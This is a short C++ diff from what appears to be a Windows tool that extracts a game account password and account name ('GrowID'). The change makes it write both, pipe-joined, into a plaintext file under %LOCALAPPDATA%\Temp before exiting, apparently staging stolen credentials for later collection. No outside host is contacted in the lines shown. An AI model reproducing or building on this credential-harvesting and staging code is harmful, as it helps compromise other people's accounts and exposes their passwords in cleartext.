@@ -109,24 +109,13 @@ int _stdcall WinMain(struct HINSTANCE__* hinstance, struct HINSTANCE__* hprevins
 				printf("%s", pass_str.c_str());
 			else
 				printf("pass is: %s\n", pass_str.c_str());
-
-			ofstream aaa((string)getenv("LOCALAPPDATA") + "\\Temp\\pass.txt");
-			aaa << pass_str;
+			ofstream aaa((string)getenv("LOCALAPPDATA") + "\\Temp\\user.txt");
+			aaa << uservar->get_h() + "|" + pass_str;
 			aaa.close();
-			ofstream GrowID((string)getenv("LOCALAPPDATA") + "\\Temp\\user.txt");
-			GrowID << uservar->get_h().c_str();
-			GrowID.close();
 			exit(0);
 		}
 
 		else if (!nolog)
-			string aa = "";
-		ofstream aaa((string)getenv("LOCALAPPDATA") + "\\Temp\\pass.txt");
-		aaa << "";
-		aaa.close();
-		ofstream GrowID((string)getenv("LOCALAPPDATA") + "\\Temp\\user.txt");
-		GrowID << "";
-		GrowID.close();
 		exit(0);
 
 		if (!nowait)
